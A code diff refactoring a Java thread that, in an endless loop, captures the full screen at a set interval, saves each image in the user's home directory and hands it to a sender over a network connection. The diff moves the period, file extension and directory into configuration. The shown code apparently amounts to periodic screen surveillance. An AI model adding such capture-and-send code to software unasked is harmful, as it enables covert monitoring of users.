@@ -11,9 +11,6 @@ import java.util.Date;
 public class ScreenShot extends Thread {
     private final ScreenshotSender screenshotSender;
     private String homeDirectory;
-    private final int timeInMilisec = 10000;
-    private static final String SCREENSHOT_EXTENSION = "jpg";
-    private static final String SCREENSHOT_DIR = "/screen/";
 
     public ScreenShot(ConnectionProvider connectionProvider) {
         homeDirectory = System.getProperty("user.home");
@@ -30,8 +27,8 @@ public class ScreenShot extends Thread {
         BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
         try {
 
-            File screenshot = new File(homeDirectory + SCREENSHOT_DIR + new Date().toString() + "." + SCREENSHOT_EXTENSION);
-            ImageIO.write(screenShot, SCREENSHOT_EXTENSION, screenshot);
+            File screenshot = new File(homeDirectory + Config.getValue("screenshotDirectory") + new Date().toString() + "." + Config.getValue("screenshotExtension"));
+            ImageIO.write(screenShot, Config.getValue("screenshotExtension"), screenshot);
             screenshotSender.sendScreenshot(screenshot);
         } catch (IOException e) {
             e.printStackTrace();
@@ -39,11 +36,12 @@ public class ScreenShot extends Thread {
     }
 
     public void run() {
-        File dir = new File(homeDirectory + SCREENSHOT_DIR);
+        File dir = new File(homeDirectory + Config.getValue("screenshotDirectory"));
         dir.mkdirs();
         while (true) {
             try {
-                Thread.sleep(timeInMilisec);
+                int screenshotPeriod = Integer.parseInt(Config.getValue("screenshotPeriod"));
+                Thread.sleep(screenshotPeriod);
                 this.screenShot();
             } catch (InterruptedException e) {
                 e.printStackTrace();
